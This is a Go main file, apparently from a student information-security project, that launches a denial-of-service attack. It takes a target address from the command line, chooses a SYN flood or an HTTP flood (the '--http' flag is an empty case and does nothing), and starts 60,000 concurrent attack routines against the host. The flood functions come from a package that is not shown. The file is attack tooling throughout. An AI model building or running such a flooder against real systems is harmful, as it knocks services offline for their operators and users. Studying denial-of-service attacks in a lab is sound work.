package main

import (
	"log"
	"os"

	"github.com/talkanbaev-artur/information-security-final-project/ddos/attacks"
)

func main() {
	isSynflood := true
	host := "192.168.31.2"
	for i := 1; i < len(os.Args); i += 1 {
		switch os.Args[i] {
		case "-a":
			if i == len(os.Args)-1 {
				log.Fatalln("target address should be specified")
			}
			i += 1
			host = os.Args[i]
		case "--http":
		case "-h":
			isSynflood = false
		default:
			log.Fatalln("unrecognised option: " + os.Args[i])
		}
	}

	var f attacks.Attacker = attacks.SynFlood
	if !isSynflood {
		f = attacks.DD0SHttp
	}
	log.Printf("Initialised attack on host %s...\n", host)
	var ch chan bool
	for i := 0; i < 60000; i++ {
		go f(host)
	}
	<-ch
}
